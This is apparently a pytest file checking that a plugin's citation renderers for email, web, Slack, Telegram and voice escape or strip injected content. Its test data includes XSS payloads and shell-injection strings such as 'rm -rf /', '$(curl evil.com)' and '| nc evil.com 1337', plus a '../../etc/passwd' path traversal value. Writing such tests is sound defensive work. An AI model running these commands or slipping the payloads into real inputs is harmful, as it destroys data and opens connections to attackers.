# SPDX-License-Identifier: MIT
"""Adversarial citation injection tests: XSS, shell injection, escape bypass."""

from __future__ import annotations

import json
from datetime import datetime, timezone
from unittest.mock import patch

import pytest
from hermes_plugins.hades.renderers import Renderer
from hermes_plugins.hades.renderers.email_citation import EmailCitationRenderer
from hermes_plugins.hades.renderers.slack_citation import (
    SlackCitationRenderer,
    escape_mrkdwn,
)
from hermes_plugins.hades.renderers.telegram_citation import escape_markdown_v2
from hermes_plugins.hades.renderers.types import (
    AugmentationResult,
    CitationSource,
    CitationType,
    Envelope,
    RetrievalLane,
)
from hermes_plugins.hades.renderers.voice_citation import (
    SHELL_METACHARS,
    VoiceCitationRenderer,
    sanitize_for_tts,
)
from hermes_plugins.hades.renderers.web_citation import WebCitationRenderer


@pytest.fixture(autouse=True)
def _mock_audit_anchor():
    with patch.object(Renderer, "audit_anchor", return_value="evt-mocked"):
        yield


def _malicious_wrapper(payload: str) -> AugmentationResult:
    """Build an AugmentationResult with `payload` injected into the per-citation Envelope.

    The wrapper itself uses safe doctrine values; only the per-citation
    fields carry the malicious content.
    """
    citation = Envelope(
        id="c-malicious01",
        type=CitationType.KG_NODE,
        source=CitationSource.GITNEXUS_QUERY,
        retrieval_lane=RetrievalLane.SEMANTIC,
        audit_event_id="evt-bad",
        confidence=0.9,
        rrf_score=0.0150,
        rrf_rank=0,
        project_id="malicious-project",
        payload=payload,
        platform_renders={"web": {"callers": [payload]}},
    )
    return AugmentationResult(
        request_id="r",
        session_id="s",
        doctrine="default",
        project_id="zen-swarm",
        citations=[citation],
        emitted_at=datetime(2026, 5, 10, 12, 0, 0, tzinfo=timezone.utc),
        kg_token_count=0,
        cache_key_hash="sha256:0",
        audit_event_id="evt-aug-malicious",
    )


                                                                             
                        
                                                                             


_XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    '<iframe src="javascript:alert(1)"></iframe>',
    "</title><script>x</script>",
    '<a href="javascript:alert(1)">x</a>',
]


@pytest.mark.parametrize("payload", _XSS_PAYLOADS)
def test_email_xss_payload_neutralised(payload: str) -> None:
    """Email renderer escapes ALL XSS payloads via markupsafe.escape."""
    env = _malicious_wrapper(payload)
    r = EmailCitationRenderer()
    html = r.render(env).output
                                                
    assert payload not in html, f"Email: payload {payload!r} survived"
                                    
    assert "<script>alert" not in html.lower()
                                                    
    assert 'href="javascript:' not in html.lower()


@pytest.mark.parametrize(
    "payload",
    [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "</article><script>x</script>",
    ],
)
def test_web_xss_payload_neutralised(payload: str) -> None:
    """Web renderer escapes ALL XSS payloads."""
    env = _malicious_wrapper(payload)
    r = WebCitationRenderer()
    html = r.render(env).output
    assert payload not in html, f"Web: payload {payload!r} survived"
    assert "<script>alert" not in html.lower()


                                                                             
                       
                                                                             


_SHELL_PAYLOADS = [
    "innocent`rm -rf /`",
    "$(curl evil.com)",
    "; rm -rf /",
    "&& rm -rf /",
    "| nc evil.com 1337",
    "> /etc/passwd",
    "innocent\nrm -rf /",
    "innocent\\evil",
]


@pytest.mark.parametrize("payload", _SHELL_PAYLOADS)
def test_voice_shell_injection_neutralised(payload: str) -> None:
    """Voice renderer strips shell metacharacters."""
    env = _malicious_wrapper(payload)
    r = VoiceCitationRenderer()
    text = r.render(env).output
    for ch in SHELL_METACHARS:
        assert ch not in text, (
            f"Voice: shell metachar {ch!r} survived from payload {payload!r}"
        )


def test_sanitize_for_tts_handles_unicode_payloads() -> None:
    """Unicode payloads with embedded shell chars: still sanitized."""
    payload = "héllo`cmd`wörld$(echo bad)"
    out = sanitize_for_tts(payload)
    for ch in SHELL_METACHARS:
        assert ch not in out


                                                                             
                                     
                                                                             


def test_telegram_markdownv2_escape_covers_all_reserved_chars() -> None:
    """Telegram MarkdownV2 reserved chars _*[]()~`>#+-=|{}.!\\ all escape."""
    reserved = "_*[]()~`>#+-=|{}.!\\"
    for ch in reserved:
        result = escape_markdown_v2(ch)
        assert result == f"\\{ch}", (
            f"Telegram escape: {ch!r} should produce '\\{ch}', got {result!r}"
        )


def test_telegram_markdownv2_chained_payload_escapes_all_reserved() -> None:
    """Compound payload with multiple reserved chars: each one escaped."""
    payload = "*bold* _italic_ ~strike~ `code` [link](url)"
    out = escape_markdown_v2(payload)
    for ch in "*_~`[]()":
        assert f"\\{ch}" in out


                                                                             
                                 
                                                                             


@pytest.mark.parametrize(
    "payload, expected_subst",
    [
        ("<script>", "&lt;script&gt;"),
        ("a & b", "a &amp; b"),
        ("<img onload=x>", "&lt;img onload=x&gt;"),
    ],
)
def test_slack_mrkdwn_escape_html_chars(payload: str, expected_subst: str) -> None:
    """Slack mrkdwn escapes < > & to HTML entities."""
    out = escape_mrkdwn(payload)
    assert expected_subst in out


def test_slack_render_xss_in_payload_neutralised() -> None:
    """End-to-end: malicious payload in Slack render → neutralised."""
    env = _malicious_wrapper("<script>alert(1)</script>")
    r = SlackCitationRenderer()
    out = r.render(env).output
    payload_str = json.dumps(out)
    assert "<script>" not in payload_str
    assert "&lt;script&gt;" in payload_str


                                                                             
                                      
                                                                             


def test_audit_event_id_with_path_traversal_does_not_inject_javascript() -> None:
    """Path-traversal in audit_event_id must not enable javascript: scheme injection.

    The  substrate is responsible for upstream audit_event_id format
    validation. Renderers must additionally never produce a runnable
    ``javascript:`` scheme regardless of what the field contains.
    """
    citation = Envelope(
        id="c-pathtrav01",
        type=CitationType.KG_NODE,
        source=CitationSource.GITNEXUS_QUERY,
        retrieval_lane=RetrievalLane.SEMANTIC,
        audit_event_id="../../etc/passwd",
        confidence=0.9,
        rrf_score=0.0150,
        rrf_rank=0,
        project_id="p",
        payload="payload-pathtrav",
    )
    wrapper = AugmentationResult(
        request_id="r",
        session_id="s",
        doctrine="default",
        project_id="p",
        citations=[citation],
        emitted_at=datetime.now(timezone.utc),
        kg_token_count=0,
        cache_key_hash="sha256:0",
        audit_event_id="evt-aug-pathtrav",
    )
    r_email = EmailCitationRenderer()
    html_email = r_email.render(wrapper).output
    assert "javascript:" not in html_email.lower()
    r_web = WebCitationRenderer()
    html_web = r_web.render(wrapper).output
    assert "javascript:" not in html_web.lower()


def test_audit_event_id_with_html_injection_attempt() -> None:
    """audit_event_id containing HTML tags must be escaped in href context."""
    citation = Envelope(
        id="c-auditxss01",
        type=CitationType.KG_NODE,
        source=CitationSource.GITNEXUS_QUERY,
        retrieval_lane=RetrievalLane.SEMANTIC,
        audit_event_id='evt-x"><script>alert(1)</script>',
        confidence=0.9,
        rrf_score=0.0150,
        rrf_rank=0,
        project_id="p",
        payload="payload-auditxss",
    )
    wrapper = AugmentationResult(
        request_id="r",
        session_id="s",
        doctrine="default",
        project_id="p",
        citations=[citation],
        emitted_at=datetime.now(timezone.utc),
        kg_token_count=0,
        cache_key_hash="sha256:0",
        audit_event_id="evt-aug-auditxss",
    )
    r_email = EmailCitationRenderer()
    html = r_email.render(wrapper).output
    assert '"><script>' not in html
    assert "&lt;script&gt;" in html
    r_web = WebCitationRenderer()
    html_web = r_web.render(wrapper).output
    assert '"><script>' not in html_web


def test_telegram_render_neutralises_markdown_injection() -> None:
    """Payload containing markdown formatting chars escapes in Telegram output."""
    from hermes_plugins.hades.renderers.telegram_citation import (
        TelegramCitationRenderer,
    )

    env = _malicious_wrapper("*injection* _attempt_ [click](evil.com)")
    r = TelegramCitationRenderer()
    msgs = r.render(env).output
    text = msgs[0]["text"]
                                                           
    for ch in "*_[]()":
        assert f"\\{ch}" in text, f"unescaped '{ch}' present in telegram output"


def test_voice_handles_repeated_metacharacters() -> None:
    """Many consecutive shell metachars: all stripped."""
    payload = "$$$$``;;;|||&&&"
    env = _malicious_wrapper(payload)
    r = VoiceCitationRenderer()
    text = r.render(env).output
    for ch in SHELL_METACHARS:
        assert ch not in text
